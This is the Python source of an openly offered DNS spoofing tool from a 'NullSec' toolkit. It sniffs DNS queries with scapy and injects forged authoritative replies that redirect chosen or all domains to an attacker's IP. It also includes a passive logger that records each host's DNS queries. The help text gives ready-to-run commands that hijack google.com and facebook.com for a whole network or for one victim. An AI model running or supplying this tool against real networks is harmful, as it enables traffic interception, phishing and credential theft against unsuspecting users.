#!/usr/bin/env python3
"""
DNS Spoofer - NullSec Network Toolkit
Author: bad-antics | GitHub: bad-antics | Discord: x.com/AnonAntics
License: NNET-XXX (Get key at x.com/AnonAntics)

     ▓█████▄  ██▀███   ██▓ ██▓███      ▓█████▄  ███▄    █   ██████ 
     ▒██▀ ██▌▓██ ▒ ██▒▓██▒▓██░  ██▒   ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒ 
     ░██   █▌▓██ ░▄█ ▒▒██▒▓██░ ██▓▒   ░██   █▌▓██  ▀█ ██▒░ ▓██▄   
"""

import argparse
import socket
import struct
import threading
import signal
import sys
from collections import defaultdict
from datetime import datetime

try:
    from scapy.all import (
        DNS, DNSQR, DNSRR, IP, UDP, Ether,
        sniff, sendp, get_if_hwaddr, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

BANNER = """
     ▓█████▄  ██▀███   ██▓ ██▓███      ▓█████▄  ███▄    █   ██████ 
     ▒██▀ ██▌▓██ ▒ ██▒▓██▒▓██░  ██▒   ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒ 
     ░██   █▌▓██ ░▄█ ▒▒██▒▓██░ ██▓▒   ░██   █▌▓██  ▀█ ██▒░ ▓██▄   
     ░▓█▄   ▌▒██▀▀█▄  ░██░▒██▄█▓▒ ▒   ░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒
     ░▒████▓ ░██▓ ▒██▒░██░▒██▒ ░  ░   ░▒████▓ ▒██░   ▓██░▒██████▒▒
      ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░    ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
     ═══════════════════════════════════════════════════════════════
                  DNS Spoofer v2.0 | github.com/bad-antics
     ═══════════════════════════════════════════════════════════════
"""

class DNSSpoofer:
    """DNS Spoofing attack tool"""
    
    def __init__(self, interface: str, target_ip: str = None, 
                 spoof_ip: str = None, domains: dict = None):
        self.interface = interface
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.domains = domains or {}
        self.running = False
        self.stats = defaultdict(int)
        self.spoofed_count = 0
        
    def dns_callback(self, packet):
        """Process DNS packets and send spoofed responses"""
        if not packet.haslayer(DNS):
            return
            
        # Only process queries
        if packet[DNS].qr != 0:
            return
            
        # Get query details
        qname = packet[DNSQR].qname.decode('utf-8').rstrip('.')
        qtype = packet[DNSQR].qtype
        
        self.stats['queries'] += 1
        
        # Check if we should spoof this domain
        spoof_target = None
        
        # Wildcard matching
        if '*' in self.domains:
            spoof_target = self.domains['*']
        
        # Exact match
        if qname in self.domains:
            spoof_target = self.domains[qname]
            
        # Suffix matching (e.g., *.example.com)
        for domain, ip in self.domains.items():
            if domain.startswith('*.'):
                suffix = domain[2:]
                if qname.endswith(suffix) or qname == suffix[1:]:
                    spoof_target = ip
                    break
                    
        if not spoof_target:
            print(f"[PASS] {qname} (A)")
            return
            
        # Only spoof A records
        if qtype != 1:
            return
            
        # Build spoofed response
        spoofed = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=53) /
            DNS(
                id=packet[DNS].id,
                qr=1,  # Response
                aa=1,  # Authoritative
                qd=packet[DNS].qd,
                an=DNSRR(
                    rrname=packet[DNSQR].qname,
                    type='A',
                    ttl=300,
                    rdata=spoof_target
                )
            )
        )
        
        sendp(Ether(dst=packet[Ether].src) / spoofed, 
              iface=self.interface, verbose=False)
        
        self.spoofed_count += 1
        self.stats['spoofed'] += 1
        
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[SPOOF] {timestamp} {qname} → {spoof_target}")
        
    def start(self):
        """Start DNS spoofing"""
        print(BANNER)
        print(f"[*] Interface: {self.interface}")
        print(f"[*] Target: {self.target_ip or 'ALL'}")
        print(f"[*] Spoofing {len(self.domains)} domain(s)")
        print()
        
        for domain, ip in self.domains.items():
            print(f"    {domain} → {ip}")
        print()
        
        self.running = True
        
        # Build BPF filter
        bpf_filter = "udp port 53"
        if self.target_ip:
            bpf_filter += f" and host {self.target_ip}"
            
        print(f"[*] Filter: {bpf_filter}")
        print("[*] Starting capture... (Ctrl+C to stop)")
        print("=" * 60)
        
        try:
            sniff(
                iface=self.interface,
                filter=bpf_filter,
                prn=self.dns_callback,
                store=0,
                stop_filter=lambda _: not self.running
            )
        except PermissionError:
            print("[-] Root privileges required!")
            sys.exit(1)
            
    def stop(self):
        """Stop spoofing"""
        self.running = False
        print()
        print("=" * 60)
        print(f"[*] Queries captured: {self.stats['queries']}")
        print(f"[*] Responses spoofed: {self.stats['spoofed']}")


class DNSQueryLogger:
    """Passive DNS query logger"""
    
    def __init__(self, interface: str, output_file: str = None):
        self.interface = interface
        self.output_file = output_file
        self.queries = defaultdict(lambda: defaultdict(int))
        self.running = False
        
    def callback(self, packet):
        """Log DNS queries"""
        if not packet.haslayer(DNS):
            return
            
        if packet[DNS].qr != 0:
            return
            
        qname = packet[DNSQR].qname.decode('utf-8').rstrip('.')
        src_ip = packet[IP].src
        
        self.queries[src_ip][qname] += 1
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_line = f"{timestamp} {src_ip:15} {qname}"
        
        print(log_line)
        
        if self.output_file:
            with open(self.output_file, 'a') as f:
                f.write(log_line + '\n')
                
    def start(self):
        """Start logging"""
        print(BANNER)
        print("[*] DNS Query Logger Mode")
        print(f"[*] Interface: {self.interface}")
        if self.output_file:
            print(f"[*] Output: {self.output_file}")
        print("[*] Logging DNS queries... (Ctrl+C to stop)")
        print("=" * 60)
        
        self.running = True
        
        try:
            sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self.callback,
                store=0,
                stop_filter=lambda _: not self.running
            )
        except PermissionError:
            print("[-] Root privileges required!")
            sys.exit(1)
            
    def print_summary(self):
        """Print query summary"""
        print()
        print("=" * 60)
        print("DNS QUERY SUMMARY")
        print("=" * 60)
        
        for ip, domains in sorted(self.queries.items()):
            print(f"\n{ip}:")
            for domain, count in sorted(domains.items(), key=lambda x: -x[1])[:10]:
                print(f"  {count:5} {domain}")


def parse_domains_file(filepath: str) -> dict:
    """Parse domains file (domain=ip per line)"""
    domains = {}
    
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                    
                if '=' in line:
                    domain, ip = line.split('=', 1)
                    domains[domain.strip()] = ip.strip()
                elif ' ' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        domains[parts[0]] = parts[1]
                        
    except FileNotFoundError:
        print(f"[-] File not found: {filepath}")
        sys.exit(1)
        
    return domains


def main():
    parser = argparse.ArgumentParser(
        description='NullSec DNS Spoofer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Spoof single domain
  sudo python3 dnsspoof.py -i eth0 -d example.com=192.168.1.100
  
  # Spoof multiple domains
  sudo python3 dnsspoof.py -i eth0 -d "*.google.com=10.0.0.1" -d "facebook.com=10.0.0.1"
  
  # Spoof all domains (wildcard)
  sudo python3 dnsspoof.py -i eth0 -d "*=192.168.1.100"
  
  # Use domains file
  sudo python3 dnsspoof.py -i eth0 -f domains.txt
  
  # Target specific host
  sudo python3 dnsspoof.py -i eth0 -t 192.168.1.50 -d "*=10.0.0.1"
  
  # Log mode only
  sudo python3 dnsspoof.py -i eth0 --log -o queries.txt

Get premium at x.com/AnonAntics
        '''
    )
    
    parser.add_argument('-i', '--interface', required=True,
                        help='Network interface')
    parser.add_argument('-t', '--target', 
                        help='Target IP to spoof (default: all)')
    parser.add_argument('-d', '--domain', action='append', default=[],
                        help='Domain to spoof (format: domain=ip)')
    parser.add_argument('-f', '--file',
                        help='File containing domains to spoof')
    parser.add_argument('--log', action='store_true',
                        help='Log mode only (no spoofing)')
    parser.add_argument('-o', '--output',
                        help='Output file for logging')
    parser.add_argument('-v', '--version', action='store_true',
                        help='Show version')
    
    args = parser.parse_args()
    
    if args.version:
        print("DNS Spoofer v2.0.0")
        print("github.com/bad-antics | x.com/AnonAntics")
        return
        
    if not SCAPY_AVAILABLE:
        print(BANNER)
        print("[-] Scapy not installed!")
        print("[*] Install with: pip install scapy")
        print()
        print("[*] Demo mode - showing example output:")
        print("=" * 60)
        demo_output = [
            "[SPOOF] 12:34:56 google.com → 192.168.1.100",
            "[SPOOF] 12:34:57 www.google.com → 192.168.1.100",
            "[PASS] time.windows.com (A)",
            "[SPOOF] 12:34:58 facebook.com → 192.168.1.100",
        ]
        for line in demo_output:
            print(line)
        return
        
    # Parse domains
    domains = {}
    
    if args.file:
        domains.update(parse_domains_file(args.file))
        
    for d in args.domain:
        if '=' in d:
            domain, ip = d.split('=', 1)
            domains[domain] = ip
            
    # Signal handler
    spoofer = None
    logger = None
    
    def signal_handler(sig, frame):
        print("\n[!] Interrupted")
        if spoofer:
            spoofer.stop()
        if logger:
            logger.running = False
            logger.print_summary()
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)
    
    # Run
    if args.log:
        logger = DNSQueryLogger(args.interface, args.output)
        logger.start()
    else:
        if not domains:
            print("[-] No domains specified!")
            print("[*] Use -d domain=ip or -f file")
            sys.exit(1)
            
        spoofer = DNSSpoofer(
            interface=args.interface,
            target_ip=args.target,
            domains=domains
        )
        spoofer.start()


if __name__ == '__main__':
    main()
